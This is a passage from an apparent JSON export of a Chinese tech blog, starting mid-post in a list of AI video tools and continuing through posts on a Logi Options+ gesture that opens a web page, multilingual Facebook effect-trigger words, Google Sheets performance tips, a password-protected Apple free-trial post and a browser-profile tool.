视频创建器可以轻松为任何潜在客户创建规格创意。现在，您可以带着完全定制的样本广告走进每一场会议。 Fliki 视频生成器 https://fliki.ai 在 2 分钟内使用逼真的声音从脚本或博客文章创建视频！将博客文章转换为视频。逼真的文字转语音。丰富的股票媒体库。受到来自 Google、Meta、Bytedance 和 Upwork 等公司的 30k+ 内容创作者的信任。 Synthesia 视频生成器 https://synthesia.io 只需输入文本即可创建 AI 视频。易于使用、便宜且可扩展。与真人演示者一起制作引人入胜的视频 - 直接从您的浏览器。免费演示。 Steve AI 视频生成器 https://steve.ai Steve AI 是面向社交媒体和内容营销人员的 AI 视频制作者，用于创建实时和动画视频。在 Steve AI 的帮助下，您可以将博客文章、脚本或文本内容转换为用于社交媒体的小型视频。它的功能包括创意人工智能、搜索人工智能和全自动解决方案。 InVideo 视频生成器 https://invideo.io 释放视频的力量。借助 InVideo，每个人都可以创建更吸引人、带来更多潜在客户并节省时间的精美专业视频。我们的库包含 5000 多个模板、过渡和效果，可帮助您轻松、快速、高效地创建视频。无需下载。 Opus 视频生成器 https://opus.ai 把文字变成电影和游戏。 WowTo 视频生成器 https://wowto.ai 在几分钟内创建操作视频并托管引人入胜的视频知识库。建立视频知识库。 Colossyan 视频生成器 https://colossyan.com Colossyan Creator 让视频创作变得简单无压力。与真人演员一起探索我们的 AI 视频创作者。在不到 5 分钟的时间内创建视频。从这里开始免费。 Xpression Camera 视频生成器 https://xpressioncamera.com Xpression Camera 是一款屡获殊荣的虚拟相机应用程序，它允许用户使用一张照片立即变身为任何人或任何有脸的人，而无需任何处理时间。xpression 相机使用户能够在使用 Zoom 等应用聊天、在 Twitch 上直播或创建 YouTube 视频时实时重新定义他们的屏幕角色。 Movio 视频生成器 https://movio.la 当你可以使用 AI 视频编辑器来创建一个代言人时，为什么还要付钱给代言人呢？MOVIO 是一种顶级合成媒体，可以将您的文本转换为视频。 Pyttipanna 视频生成器 https://pyttipanna.xyz Pyttipanna 是 Pytti 5 的一个界面。它允许您构建、叙述和试验视频创建的提示。Pytti 是一个使用机器学习模型创建和渲染视频的框架。 Peech 视频生成器 https://peech-ai.com 将您的内容团队变成不可阻挡的创作者。自动转录、编辑、重新利用和标记您的视频内容 - 所有这些都在一个地方并大规模制作视频内容。 Wonder Dynamics 视频生成器 https://wonderdynamics.com 在 Wonder Dynamics，我们将 AI 技术与一流的故事讲述相结合。 Creative Reality Studio (D-ID) 视频生成器 https://studio.d-id.com 世界上第一个结合了 GPT-3、Stable Diffusion 和 D-ID 独特的面部动画技术的平台。我们的生成式 AI 会在几秒钟内将您的视野变成会说话的化身。 LiveReacting AI 视频生成器 https://livereacting.com 使用我们的 AI 主持人提升您的现场表演。节省时间和金钱，同时为您的观众提供互动和引人入胜的体验。 Audiolabs 视频生成器 https://audiolabs.io 将您的播客转换为适合 TikTok、YouTube Shorts 和 Reels 的短视频的平台。接触新的播客听众并推动业务成果 🎙️在短格式平台上发布视频剪辑充当听众发现您的库存并收听完整剧集或其他营销目标的“钩子” Hourone 视频生成器 https://hourone.ai 欢迎来到 Hour One——世界上发展最快的 AI 视频制作者。我们将文字转为视频，让学习和发展变得更加有趣和有效。现在试试！ VidIQ 视频生成器 https://vidiq.com 使用 AI 提升您的 YouTube 观看次数。获得免费的见解和指导，以保持您的频道不断发展。 ","tags":[{"index":-1,"name":"AI 科技","slug":"ai-tech","used":true,"link":"https://dev-coco.github.io/tag/ai-tech/"}],"title":"AI 人工智能列表","feature":"https://dev-coco.github.io/post-images/AI-List.jpg","link":"https://dev-coco.github.io/post/AI-List/","stats":{"text":"125 min read","time":7446000,"words":33456,"minutes":125},"date":"2023-02-12 11:41:38","dateFormat":"2023-02-12"},{"content":"软件本身没有此功能，但是可以通过其它方法实现。 之前使用 Logi Options 的时候是有打开网页的功能，但是不知道为什么在 Plus 版本，就没有打开网页的功能了，只能另辟奇径来实现这个效果。 本来是打算用 shell 来解决这个问题的，但是在 macOS 12 的时候是可以使用的，不知为何在 macOS 13 就出现下面的提示。 既然无法直接运行 Shell，那么就把 Shell 打包成应用程序来运行。 编写脚本 使用 AppleScript，放入下面的代码。 do shell script &quot;open https://dev-coco.github.io/Online-Tools/Online-Code-Editor.html&quot; do shell script 通过 shell 来执行命令，open 是用来打开后面的内容，那么把需要打开的链接放在后面，这样执行的时候就可以打开链接了。 打包 App 点击左上角的「文件」，选择「导出」。 设置一个名字，「文件格式」选择应用程序，勾选「仅运行」，点击存储。 然后就会生成好应用程序了，运行后就会打开链接。 设置手势 在 Logi Options 设置手势，选择「打开应用程序」或「打开文件」都可以，选择刚才生成好的应用程序。 激活手势后就可以正常打开网页了。 ","tags":[{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"},{"index":-1,"name":"macOS","slug":"macos","used":true,"link":"https://dev-coco.github.io/tag/macos/"}],"title":"Logi Options+ 手势打开网页","feature":"https://dev-coco.github.io/post-images/Logi-Options-Open-Web.png","link":"https://dev-coco.github.io/post/Logi-Options-Open-Web/","stats":{"text":"2 min read","time":74000,"words":340,"minutes":2},"date":"2023-02-10 01:42:36","dateFormat":"2023-02-10"},{"content":"Facebook 特效文字，点击后可触发特效动画。 table { margin: 0 auto !important;} 气球 语言 内容 英语 congrats 英语 congratulations 捷克语 gratuluju 捷克语 gratuluji 捷克语 gratulujeme 捷克语 blahopřeju 捷克语 blahopřeji 捷克语 blahopřejeme 挪威语 Til lykke 挪威语 Tillykke 德语 Glückwunsch 德语 Gratuliere 西班牙语 felicitaciones 西班牙语 enhorabuena 芬兰语 paljon onnea 芬兰语 onnittelut 法语 Félicitations 匈牙利语 gratula 匈牙利语 gratulálok 匈牙利语 gratulálunk 意大利语 congratulazioni 意大利语 complimenti 日语 おめでとう 日语 おめでとうございます 韩语 축하해 韩语 축하해요 挪威语 gratulerer 荷兰语 Gefeliciteerd 波兰语 gratulacje 葡萄牙语 Parabéns 葡萄牙语 felicitações 罗马尼亚语 felicitări 俄语 мои поздравления 俄语 поздравляем 俄语 поздравляю 斯洛伐克语 gratulujem 斯洛伐克语 blahoželám 泰语 ยินดีด้วย 泰语 ขอแสดงความยินดี 土耳其语 tebrikler 土耳其语 tebrik ederim 中文 恭喜 中文 祝贺你 中文 恭喜你 布尔语(南非荷兰语) baie geluk 荷兰语 veels geluk 孟加拉语 অভিনন্দন 克罗地亚语 Čestitam 克罗地亚语 Čestitke 克罗地亚语 Čestitamo 希腊语 Συγχαρητήρια 希腊语 Μπράβο 古吉拉特语 અભિનંદન 印地语 badhai 印地语 बधाई 马拉地语 अभिनंदन 塞尔维亚语 Честитам 塞尔维亚语 Свака част 斯瓦希里语 hongera 泰米尔语 வாழ்த்துகள் 泰米尔语 வாழ்த்துக்கள் 泰卢固语 అభినందనలు 马拉雅拉姆语 അഭിനന്ദനങ്ങൾ 越南语 Chúc mừng 希伯来语 מזל טוב 保加利亚语 mazel tov 保加利亚语 mazal tov 碰拳 语言 内容 英语 gg 跳跃的赞 语言 内容 英语 you got this 捷克语 to dáš 捷克语 to dáte 挪威语 du har styr på det 德语 du schaffst das 西班牙语 tú puedes hacerlo 西班牙语 tú puedes lograrlo 西班牙语 tú puedes 芬兰语 pärjäät kyllä 法语 ça va le faire 匈牙利语 meg tudod csinálni 意大利语 ce la farai 日语 大丈夫 韩语 잘 될거에요 挪威语 du klarer dette 荷兰语 je kunt het aan 波兰语 Dasz radę! 葡萄牙语 já deu certo 葡萄牙语 vais conseguir 俄语 у тебя все получится 捷克语 to zvládneš 瑞典语 du klarar detta 泰语 คุณทำได้อยู่แล้ว 土耳其语 başaracaksın 中文 你行的 中文 你可以的 布尔语(南非荷兰语) jy het dit 孟加拉语 আপনি এটি পেয়েছেন। 克罗地亚语 ti to možeš 英语 you've got this 英语 t'es capable 希腊语 καλή επιτυχία 古吉拉特语 શાબાશ 印地语 शाबाश 印尼语 pasti sukses 卡纳达语 ನೀವು ಇದನ್ನು ಪಡೆದುಕೊಂಡಿರುವಿರಿ 马来语 anda mendapat ini 马拉地语 तुला हे मिळालेच समज 旁遮普语 ਤੁਹਾਨੂੰ ਇਹ ਪ੍ਰਾਪਤ ਹੋਇਆ 塞尔维亚语 знам да ћеш успети 西班牙语 una hii 菲律宾语 kaya mo ito 泰米尔语 உன்னால் பெற முடியும் 泰卢固语 మీరు దీనిని సాధించారు 马拉雅拉姆语 നിങ്ങളിത് നേടി 越南语 bạn đã làm được 阿拉伯语 أثق في قدرتك على تحقيق هذا 乌尔都语 آپ کر سکتے ہیں 缅甸语 ဤအရာကို သင်ရထားသည် 缅甸语 ဤအရာကို သင္ရထားသည္ 火箭赞 语言 内容 英语 radness 德语 der Hammer 法语 génial 爱尔兰语 daora 泰语 สุดปัง 奥洛莫语 kamaal 马来语 luar biasa 爱心 语言 内容 英语 xoxoxo 英语 xoxo 丹麦语 Kys og knus 西班牙语 besos y abrazos 法语 bisou 法语 bisous 韩语 꽁냥꽁냥 葡萄牙语 Um abraço 罗马尼亚语 pupici 土耳其语 cmuk 泰语 จุ๊บๆ 泰语 จุ๊บจุ๊บ 土耳其语 öptüm 中文 么么哒 克罗地亚语 Šaljem poljupce! 希腊语 φιλάκια 马来语 peluk 塞尔维亚语 Грлим те 马拉雅拉姆语 ഉമ്മ 鲜花赞 语言 内容 英语 wonderful time 英语 lovely time 斯洛伐克语 super zábava 丹麦语 en dejlig dag 丹麦语 en dejlig aften 德语 viel Spaß 西班牙语 que la hayas pasado genial 西班牙语 que lo hayas pasado genial 西班牙语 que la hayan pasado genial 西班牙语 que lo hayan pasado genial 西班牙语 que la hayas pasado increíble 西班牙语 que lo hayas pasado increíble 西班牙语 que la hayan pasado increíble 西班牙语 que lo hayan pasado increíble 芬兰语 oli hieno 芬兰语 oli mukavaa 法语 bien amusé 法语 bien amusés 法语 bien amusée 法语 bien amusées 意大利语 divertente 意大利语 divertito 意大利语 divertita 意大利语 divertiti 意大利语 divertite 意大利语 divertimento 日语 素晴らしい時間 日语 すばらしい時間 日语 素晴らしいひととき 日语 素晴らしいひと時 韩语 멋진 시간 挪威语 ha det fantastisk 丹麦语 har det fantastisk 挪威语 hadde det fantastisk 挪威语 har hatt det fantastisk 挪威语 får det fantastisk 荷兰语 genoten 波兰语 cudowne chwile 俄语 отлично провел время 俄语 отлично провела время 俄语 отлично провели время 俄语 замечательно провел время 俄语 замечательно провела время 俄语 замечательно провели время 斯洛伐克语 nádherné chvíle 瑞典语 underbart 土耳其语 harika zaman 土耳其语 harika vakit 中文 嗨爆了 中文繁体 精彩時刻 中文繁体 精彩時光 中文繁体 美妙時光 布尔语(南非荷兰语) wonderlike tyd 阿尔巴尼亚语 kohë e mrekullueshme 孟加拉语 অপূর্ব সময় 保加利亚语 прекарах си страхотно 保加利亚语 прекарахме страхотно 保加利亚语 изкарах си страхотно 保加利亚语 изкарахме страхотно 克罗地亚语 bilo je lijepo 克罗地亚语 bilo lijepo 克罗地亚语 lijepo proveli 古吉拉特语 મસ્ત સમય । અદ્ભુત સમય 印地语 बेहतरीन समय 卡纳达语 ಅದ್ಭುತ ಸಮಯ 立陶宛语 puikus laikas 印尼语 saat yang indah 马拉地语 मस्त वेळ 旁遮普语 ਸ਼ਾਨਦਾਰ ਸਮਾਂ 塞尔维亚语 добро провели 塞尔维亚语 добро провести 塞尔维亚语 добар провод 斯瓦希里语 muda mzuri 泰米尔语 அருமையாக 泰米尔语 அருமையான நேரம் 泰米尔语 அருமையான 泰卢固语 అద్భుతమైన సమయం 马拉雅拉姆语 അസുലഭ നിമിഷം 乌克兰语 чудовий час 越南语 thời gian tuyệt diệu 阿拉伯语 وقت رائع 阿拉伯语 أوقات رائعة 乌尔都语 بہترین وقت 缅甸语 အံ့ဩစရာအချိန် 缅甸语 အံ့ဩစရာအခ်ိန္ 捷克语 skvělá zábava 挪威语 en hyggelig dag 丹麦语 en hyggelig aften 西班牙语 que la pases genial 西班牙语 que lo pases genial 西班牙语 que la pasen genial 西班牙语 que lo pasen genial 西班牙语 que la pases increíble 西班牙语 que lo pases increíble 西班牙语 que la pasen increíble 西班牙语 que lo pasen increíble 西班牙语 gran experiencia 西班牙语 buen momento 芬兰语 aivan mahtava 芬兰语 aivan ihana 意大利语 bella serata 意大利语 bella giornata 意大利语 bel pomeriggio 意大利语 bella mattinata 日语 素敵な時間 日语 すてきな時間 日语 ステキな時間 日语 素敵なひととき 日语 ステキなひととき 日语 素敵なひと時 日语 ステキなひと時 韩语 좋은 시간 挪威语 ha det hyggelig 挪威语 har det hyggelig 挪威语 hadde det hyggelig 挪威语 har hatt det hyggelig 挪威语 får det hyggelig 荷兰语 echt geweldig 波兰语 bardzo miło 波兰语 wspaniale 波兰语 świetnie 斯洛伐克语 krásne chvíle 瑞典语 en trevlig stund 土耳其语 güzel zaman 土耳其语 güzel vakit 中文 很开心 中文繁体 美好時光 中文繁体 美好時刻 布尔语(南非荷兰语) heerlike tyd 阿尔巴尼亚语 kohë e bukur 孟加拉语 সুন্দর সময় 保加利亚语 прекарах си чудесно 保加利亚语 прекарахме чудесно 保加利亚语 изкарах си чудесно 保加利亚语 изкарахме чудесно 克罗地亚语 bilo je divno 克罗地亚语 bilo divno 克罗地亚语 divno proveli 克罗地亚语 uživao sam 克罗地亚语 uživala sam 克罗地亚语 uživali smo 古吉拉特语 સારો સમય । સુંદર સમય । સરસ સમય 印地语 बढ़िया समय 卡纳达语 ಸುಂದರ ಸಮಯ 立陶宛语 malonus laikas 印尼语 saat yang menyenangkan 马拉地语 छान वेळ 马拉地语 सुंदर वेळ 旁遮普语 ਦਿਲਕਸ਼ ਸਮਾਂ 塞尔维亚语 лепо провели 塞尔维亚语 лепо провести 斯瓦希里语 muda wa kupendeza 泰米尔语 இனிமையாக 泰米尔语 இனிமையான நேரம் 泰卢固语 మనోహరమైన సమయం 马拉雅拉姆语 ആസ്വാദ്യകരമായ നിമിഷം 乌克兰语 милий час 越南语 thời gian tuyệt vời 越南语 thời gian thú vị 越南语 thời gian đẹp 阿拉伯语 وقت سعيد 阿拉伯语 أوقات سعيدة 乌尔都语 خوشگوار وقت 缅甸语 ချစ်စရာ့အချိန် 缅甸语 ခ်စ္စရာ့အခ်ိန္ 五角星 语言 内容 英语 you're the best 英语 you're the bestest 捷克语 jsi nejlepší 捷克语 jste nejlepší 捷克语 jsi jednička 捷克语 jste jednička 丹麦语 du er den bedste 丹麦语 du er bare den bedste 德语 du bist der Beste 德语 du bist die Beste 德语 ihr seid die Besten 芬兰语 olet paras 法语 t'es le meilleur 法语 t'es la meilleure 法语 tu es le meilleur 法语 tu es la meilleure 匈牙利语 te vagy a legjobb 意大利语 sei il migliore 意大利语 sei la migliore 意大利语 sei il numero uno 意大利语 sei la numero uno 日语 あなたが一番！ 日语 あんたが一番！ 日语 君が一番！ 日语 あなたは最高！ 日语 あんたは最高！ 日语 君は最高！ 韩语 네가 최고야 挪威语 du er den beste 挪威语 du er best 荷兰语 je bent de beste 波兰语 jesteś wspaniały 波兰语 jesteś wspaniała 波兰语 bosko 波兰语 o to chodziło 葡萄牙语 você é incrível 西班牙语 és o maior 加泰罗尼亚语 és a maior 葡萄牙语 são os maiores 葡萄牙语 são as maiores 罗马尼亚语 eşti cel mai bun 罗马尼亚语 eşti cea mai bună 罗马尼亚语 eşti cea mai bun(ă) 俄语 ты лучший 俄语 ты лучшая 俄语 вы лучшие 斯洛伐克语 si najlepší 斯洛伐克语 si najlepšia 斯洛伐克语 ste najlepší 斯洛伐克语 si jednotka 斯洛伐克语 ste jednotka 瑞典语 du är bäst 土耳其语 süpersin 土耳其语 süpersiniz 土耳其语 harikasın 土耳其语 harikasınız 中文 你真棒 中文 你最棒啦 中文 有你真好 中文 你最好了 中文 你好叻 中文繁体 你好勁 中文 你最棒了 布尔语(南非荷兰语) jy's die beste 布尔语(南非荷兰语) jy is die beste 阿尔巴尼亚语 je më i miri 阿尔巴尼亚语 je më e mira 孟加拉语 আপনি সবার সেরা 孟加拉语 তুই সবার সেরা 孟加拉语 তুমি সবার সেরা 保加利亚语 Ти си върхът 克罗地亚语 najbolji si 克罗地亚语 najbolja si 希腊语 είσαι μοναδικός 希腊语 είσαι μοναδική 希腊语 είσαι ο καλύτερος 希腊语 είσαι η καλύτερη 希腊语 είσαι αστέρι 古吉拉特语 તમે બહુ સારા છો । તમે શ્રેષ્ઠ છો 印地语 तुम कमाल हो 印地语 तुम शानदार हो 马来语 hebat 马来语 mantap 马来语 terbaik 卡纳达语 ನೀನು ಅತ್ಯುತ್ತಮ 立陶宛语 tu geriausias 立陶宛语 tu geriausia 马拉地语 तुम्ही सर्वोत्तम आहात 马拉地语 तू खूप छान आहेस 旁遮普语 ਤੁਸੀਂ ਸਰਵੋਤਮ ਹੋ 塞尔维亚语 најбољи си 塞尔维亚语 најбоља си 斯瓦希里语 wewe ni bora zaidi 英语 the best ka 泰米尔语 உன்னை அடிச்சிக்கவே முடியாது 泰米尔语 உன்னை மிஞ்ச முடியாது 泰米尔语 உனக்கு நிகர் யாருமில்லை 泰米尔语 உனக்கு நிகர் நீயேதான் 泰米尔语 உன்னைத் தாண்ட ஆளில்லை 马拉雅拉姆语 ഏറ്റവും നല്ല സുഹൃത്ത് നീയാണ് 塞尔维亚语 ти супер 阿拉伯语 أنت الأفضل 阿拉伯语 أنت الأحسن 阿拉伯语 لا مثيل لك 阿拉伯语 أنت أحسن ما في الدنيا 乌尔都语 آپ بہترین ہیں 缅甸语 သင်ဟာ အကောင်းဆုံးပါပဲ 缅甸语 သင္ဟာ အေကာင္းဆုံးပါပဲ ","tags":[{"name":"Facebook","slug":"facebook","used":true,"link":"https://dev-coco.github.io/tag/facebook/"}],"title":"Facebook 特效文字","feature":"https://dev-coco.github.io/post-images/Facebook-Effect-Text.jpg","link":"https://dev-coco.github.io/post/Facebook-Effect-Text/","stats":{"text":"11 min read","time":630000,"words":2454,"minutes":11},"date":"2023-02-03 20:37:22","dateFormat":"2023-02-03"},{"content":"一个通用型性能优化技巧，加快数据传输速度。 适用场景 有时候在 Google 表格使用 IMPORTRANGE 或 VLOOKUP 等函数，遇到大范围的数据，运行起来速度就会特别慢。 优化思路 将数据 “压缩”，等传输或者运算后，再将数据 “解压缩”。 实例 例如从 B1 到 V18 范围，如果要将这个范围的数据，使用 IMPORTRANGE 导入到其它电子表格，那么就需要导入 378 个单元格。 使用 JOIN 函数对数据进行横向拼接。 =JOIN(&quot;@&quot;, B1:V1) 注意，定界符必须是独一无二的，不能出现在拼接的数据中，否则下面的步骤会出现异常。JOIN 函数不支持数组，如果需要使用数组合并，需要将字符挨个拼接到一起。 =ARRAYFORMULA(B:B&amp;&quot;@&quot;&amp;C:C&amp;&quot;@&quot;&amp;D:D&amp;&quot;@&quot;&amp;E:E&amp;&quot;@&quot;&amp;F:F&amp;&quot;@&quot;&amp;G:G&amp;&quot;@&quot;&amp;H:H&amp;&quot;@&quot;&amp;I:I&amp;&quot;@&quot;&amp;J:J&amp;&quot;@&quot;&amp;K:K&amp;&quot;@&quot;&amp;L:L&amp;&quot;@&quot;&amp;M:M&amp;&quot;@&quot;&amp;N:N&amp;&quot;@&quot;&amp;O:O&amp;&quot;@&quot;&amp;P:P&amp;&quot;@&quot;&amp;Q:Q&amp;&quot;@&quot;&amp;R:R&amp;&quot;@&quot;&amp;S:S&amp;&quot;@&quot;&amp;T:T&amp;&quot;@&quot;&amp;U:U&amp;&quot;@&quot;&amp;V:V) 拼接在一起后，A 列的数据就已经包含了右边一大堆的单元格的数据了。 现在将这一部分数据使用 IMPORTRANGE 函数导入到其它的电子表格，只需要获取 A1 到 A18 的范围，也就是 18个单元格，这样相比 378 个单元格的数据要少很多很多。 使用 SPLIT 函数将数据拆分开。 =SPLIT(A1, &quot;@&quot;, TRUE, FALSE) 移除空白参数要设置 FALSE，否则遇到空白的内容会跳过，这样会造成位置偏移。SPLIT 函数支持使用数组输出。拆分后的数据和源数据的显示效果是一样的。 思路总结 这个思路有点类似文件压缩和解压缩，将大量的数据合并到一起，减少传输的数据量，获取到数据后再进行拆分。这个方法同样也适用于 VLOOKUP, FILTER, QUERY 等函数。 为你推荐：Google Excel 性能优化教程目录 ","tags":[{"name":"Excel","slug":"excel","used":true,"link":"https://dev-coco.github.io/tag/excel/"}],"title":"Google Excel 性能优化 - 数据压缩","feature":"https://dev-coco.github.io/post-images/Google-Excel-Boost-Compress.png","link":"https://dev-coco.github.io/post/Google-Excel-Boost-Compress/","stats":{"text":"3 min read","time":144000,"words":583,"minutes":3},"date":"2023-02-03 00:17:57","dateFormat":"2023-02-03"},{"content":"创建小型辅助表。 适用场景 从大型数据中根据需求建立一个小型数据的辅助表。 优化思路 使用筛选函数，根据条件筛选出需要的部分，并创建辅助表，再进行下一步的使用。 实例一 例如要从 A 到 C 列查询出小李，小蓝和小红的分数，如果按照常规 VLOOKUP 匹配的方式，小李要计算 6 次，小蓝要计算 8 次，小红要计算 10 次，一共就需要计算 24 次才能得到结果。VLOOKUP 计算原理参考：IF 跳过无效内容。 从名字的特征中可以看出，这些都属于优等生的名单，差等生的数据是用不到的，那么就可以将优等生先筛选出来作为辅助表。 这样就得到了一个更小数据的内容了。 这个时候再使用 VLOOKUP 去匹配数据，小李要计算 4 次，小蓝要计算 5 次，小红要计算 6 次，一共需要计算 15 次就能得到结果，要比常规的方式计算速度快更一些。数据越大，性能提高的就会越显著。 注意：请勿将筛选辅助表的函数嵌套在 VLOOKUP 内运行，这样不仅性能得不到提升，反而性能会降低很多。 因为在 VLOOKUP 查询之前，需要将数据源先筛选一遍，然后再将筛选的后结果进行匹配，这样计算的内容要比数据源更大了，所以会导致性能降低。 实例二 需要将 A 和 B 列的内容，跨表引用到另外一个表格中，但是只需要近 30 天的数据。使用 FILTER 函数，再用 TODAY 进行计算，把近 30 天的数据创建一个小型的辅助表。这样最终要跨表引用的数据就会小一些了。 为你推荐：Google Excel 性能优化教程目录 ","tags":[{"name":"Excel","slug":"excel","used":true,"link":"https://dev-coco.github.io/tag/excel/"}],"title":"Google Excel 性能优化 - 创建辅助表","feature":"https://dev-coco.github.io/post-images/Google-Excel-Boost-Auxiliary-Sheet.png","link":"https://dev-coco.github.io/post/Google-Excel-Boost-Auxiliary-Sheet/","stats":{"text":"2 min read","time":103000,"words":495,"minutes":2},"date":"2023-02-02 13:42:32","dateFormat":"2023-02-02"},{"content":"Apple 全家桶包含：Fitness+、Apple TV、Apple Music、News+、Arcade、iCloud+。 staticrypt-form{background:#fff;max-width:360px;margin:0 auto;padding:45px;text-align:center;box-shadow:0 0 20px 0 rgba(0,0,0,.2),0 5px 5px 0 rgba(0,0,0,.24)}.staticrypt-form input{background:#f2f2f2;width:100%;margin:0 0 15px;padding:15px;box-sizing:border-box;font-size:14px}.staticrypt-form .staticrypt-decrypt-button{background:#4caf50;width:100%;padding:15px;color:#fff;font-size:14px} 美区账号亲测领取成功，其它区域的账号请自行测试。 订阅 Telegram 频道：瑞景乐的博客 获取密码 请输入密码后查看 var a=256,b=1e3;function c(c,d){var e=CryptoJS.enc.Hex.parse(c.substr(0,32)),f=CryptoJS.enc.Hex.parse(c.substr(32,32)),g=c.substring(64),h=CryptoJS.PBKDF2(d,e,{keySize:a/32,iterations:b}),i=CryptoJS.AES.decrypt(g,h,{iv:f,padding:CryptoJS.pad.Pkcs7,mode:CryptoJS.mode.CBC}).toString(CryptoJS.enc.Utf8);return i}document.getElementById(\"staticrypt-form\").addEventListener(\"submit\",function(e){e.preventDefault();var a=document.getElementById(\"staticrypt-password\").value,b=\"9244563a49bda8f2b4f90145ffada78d13d352920ea5b2c4c80c3a6289c35cc2339ed145c01a5bdc530cf2a1411cfa1b3ef879d133bf6e0fc3872031bad4e6e4xvVQMaP8ZyTACjYqnxyms2UcYS2rNJXFDm8Bez9A8W84AVFWF4JAc8BAZwlZGHSJX95g+Rrs9QgyAI6l7wHjD2tsckLlkf/NpeJowVzGfpVp3r9O4ttQNvP8q+kU0HHOQuPaOzPDDseoSiKCa19L3NF8Hf5P0Jo/lzhRTwELQoBqQjdnFQSlwdrxiYtx8y0gR/naLbWxLl38XwI0nykxzQHEB96bL11EBHa+I2WDnt6rZkAFoFkC5IZ/+vyZmnNTRzFRFRDVgemjOMXRAYNQsyLvPR0mobEHO+1yekGp1dvtu9AAcWNVPDFtlT4MFcp83hQTEDMuy/lt0W2BaI9b15B1OwOIVtgdZorgW8ot4ZoH2wKcZ1xLOB7G99fnBkuavbzbm0RxyBCFjYu23I/mYaRNAOujMbh+1PYJFtG/7vDe+IshseEDUh0lNUz27EgHS/LXTePBGOPt+5oTTNysSkgAccnRUAJiw1FS1qel1vak0vg7ZrRkHGlO90pEkyR1W7tNRtfY8Cy2zwt7q1xNGKrfOSFylkrgtQpMb6v+nGDvONUS+wKiOsFcv4sPKY6CvVuCv7689P+jc/ZiQSnnndszs/rhfhiK73XI0svg0I5lnbPgWVH9fGxpI/2Ane9vS+sry9NudR1DVB4aL2qW82qsi1V8T6QcsOvWbWVatYdF6lMUojUbrpMdsyMiRwzzjCnF/H39jNJH4iRJeiUJYny4Ge+Z0SvTogtZ6+J4RTLOgUNJVufI6OdLHirRaZJnMckTvx4jwf9uEYDhcG33po2IZBITkKXDW90S9zrLO+j+qewUgDASb+VKbwP/KPSkAvwpuxx4JpcByFFsLQzkITj7bnktXopHiCAHEKYdvt9EGLbL4d7DETnROW479WfKG5Nv/gGRFt6YyB/6Gzh79QTVJBkf2YPkN30kZtdWgZeAKaJEKbrl9ZxkBYxSJvAnXrU9bqmYBXVMF7uqYhhd9it5uR2Bn9ClGqHa17DGsjXqA0CSBnEXnskaV086eL/4N4G1ae2Uv26Ci+MM8EWbQO4pOpNnjiRSfDjWv8bCVhbMPonoXAx5oVnxQMPCZO+ycgzaovLAH5lvklBk2TZmiYK+7sGLJQRdZPDh3X6OL/2RUVwLbC06sAVpLb++mC+mg5409jBGtbiUm5B82GulvQ2sfHHarczGirr3ymaHVjed6oB9y6Qigit1vE1WxYIZs8ANOSQca+eHp58Mt8vh7u7OsHEfqkJyExkWVjYaBAAUSrJJ36Yjh1zxhQay0Kj6Homn3hfq7q7rQIQ0ceV8qTOAr0Dz+F66nWnMdGZ8Acphg7P1oHAuJ5aQfN4RIZubCNU7QNJfW5fXXcw/qMEUjA3uDr6VcGwdWFfXqWZ9Ycd14yXw/CS5snNJac3UOolj45Tv8ZPWGoqs7IBRpKTjlzTOXHFzavhUmBtTibUmyrdPceQEKt1YFwSlw6N1h8XzoL51ap8Pyfx9QMu0wZq9sg==\",f=b.substring(0,64),d=b.substring(64),g=CryptoJS.HmacSHA256(d,CryptoJS.SHA256(a).toString()).toString();if(g!==f){alert(\"Wrong Password!\");return}var h=c(d,a);document.getElementById(\"article\").innerHTML=h}) ","tags":[{"name":"iOS","slug":"ios","used":true,"link":"https://dev-coco.github.io/tag/ios/"},{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"},{"index":-1,"name":"macOS","slug":"macos","used":true,"link":"https://dev-coco.github.io/tag/macos/"}],"title":"Apple 全家桶免费体验","feature":"https://dev-coco.github.io/post-images/Apple-Service-Free-Trial.png","link":"https://dev-coco.github.io/post/Apple-Service-Free-Trial/","stats":{"text":"2 min read","time":100000,"words":290,"minutes":2},"date":"2023-01-31 13:15:32","dateFormat":"2023-01-31"},{"content":"一个简单便捷的功能快速新建浏览器人员并且带配置。 如何安装 从 软件列表 下载 新建浏览器人员软件。 使用前的准备 新建一个浏览器人员，并且将浏览器设置好，选择备份配置。 选择对应的浏览器。 在桌面上会生成一个 browserConfig 文件夹，里面是浏览器人员的配置文件。 原理参考：Chrome 复制浏览器配置 使用说明 打开软件后，选择对应的浏览器。 然后输入需要新建浏览器人员的数量，根据电脑配置选择，请勿一次性设置过多，避免卡顿。设置完成后点击 好 按钮，耐心等待。 如果是第一次使用，会出现下图的提示，点击好。 当通知中心提示完成，就说明已经建立完成。 ","tags":[{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"},{"index":-1,"name":"macOS","slug":"macos","used":true,"link":"https://dev-coco.github.io/tag/macos/"}],"title":"快速新建浏览器人员工具","feature":"https://dev-coco.github.io/post-images/Browser-Copy-Profile.png","link":"https://dev-coco.github.io/post/Browser-Copy-Profile/","stats":{"text":"1 min read","time":45000,"words":224,"minutes":1},"date":"2023-01-25 18:31:38","dateFormat":"2023-01-25"},{"content":"比原生的方式更快的方法。 适用场景 有大量的数据，或者动态的数据需要跨表引用。 优化思路 将需要引用的数据拆分成多个异步执行，或者引用限定的范围。 实例一 有一个 30 万的数据需要跨表引用。如果是常规的方法直接引用 =IMPORTRANGE(&quot;SheetID&quot;, &quot;A1:A300000&quot;) 大约需要 12 秒左右。 把 30 万的数据平均拆成 10 份，每个引用 3 万的数据，并且用数组执行。 ={ IMPORTRANGE(&quot;SheetID&quot;, &quot;A1:A30000&quot;); IMPORTRANGE(&quot;SheetID&quot;, &quot;A30001:A60000&quot;); IMPORTRANGE(&quot;SheetID&quot;, &quot;A60001:A90000&quot;); IMPORTRANGE(&quot;SheetID&quot;, &quot;A90001:A120000&quot;); IMPORTRANGE(&quot;SheetID&quot;, &quot;A120001:A150000&quot;); IMPORTRANGE(&quot;SheetID&quot;, &quot;A150001:A180000&quot;); IMPORTRANGE(&quot;SheetID&quot;, &quot;A180001:A210000&quot;); IMPORTRANGE(&quot;SheetID&quot;, &quot;A210001:A240000&quot;); IMPORTRANGE(&quot;SheetID&quot;, &quot;A240001:A270000&quot;); IMPORTRANGE(&quot;SheetID&quot;, &quot;A270001:A300000&quot;) } 因为 IMPORTRANGE 函数是异步运行，所以并不会等待前面的结果计算完成后再运行下一个 IMPORTRANGE，而是在执行的过程中继续往下运行。大于需要 9 秒左右，相比常规的跨表引用速度要快。 